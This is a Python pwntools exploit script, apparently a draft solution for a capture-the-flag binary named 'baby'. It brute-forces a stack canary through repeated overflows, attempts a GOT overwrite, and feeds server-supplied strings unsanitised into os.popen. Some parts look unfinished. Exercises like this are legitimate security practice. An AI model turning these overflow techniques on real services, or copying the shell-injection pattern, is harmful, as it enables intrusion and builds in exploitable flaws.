#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

#p = remote("52.52.199.139",31337)
p = process("./baby")

def pow():

    time.sleep(0.3)
    data = p.recvuntil("Solution: \n")
    chall = data.split("\n")[1].split(":")[1].strip()
    n = data.split("\n")[2].split(":")[1].strip()
    res = os.popen("./pow.py " + chall + " " + n).read()
    target = res.split("Solution: ")[1].split("->")[0].strip()
    p.sendline(target)
    time.sleep(0.2)
    
    
    


def test():

    p.send("\x00"*8)
    p.send("\x00"*8)
    p.send("\x00"*8 + "\x00"*8)
    time.sleep(0.1)
    p.interactive()


def brute_canary():

    #7 bytes to brute.
    char = ""
    i = 0
    first = "\x00" * 8 
    second = "\x00" * 8
    third = "\x00" * 8
    temp = first
    canary = ""
    while len(temp) <16: 
        for i in range(0xff):
            try:
                char = chr(i)
                temp = first + char
                p.send(temp)
                time.sleep(0.1)
                p.send(second)
                time.sleep(0.1)
                p.send(third)
                time.sleep(0.1)
                data = p.recvuntil("Go\n",timeout=10)
                if "smashing" in data:
                    continue
                else:
                    print "Hit!"
                    first = first + char
                    canary += char
                    break
            except:
                break
    print "found canary : " + canary.encode('hex') 
    print temp
    #verify 
    p.send(temp)
    time.sleep(0.3)
    p.send(second)
    time.sleep(0.3)
    p.send(third)
    time.sleep(1.2)
    print "[*]Verify.."
    data = p.recv()
    print data
    
def guess_got():

    got = 0x601028
    alarm_plt = 0x4004a0
    for i in range(176,177):
        print "[*]trying " + str(i)
        p.send(p64(0x0))
        time.sleep(0.5)
        p.send(chr(0x0)) #now stack_chk_fail is alarm_plt
        time.sleep(0.5)
        p.interactive()

guess_got()
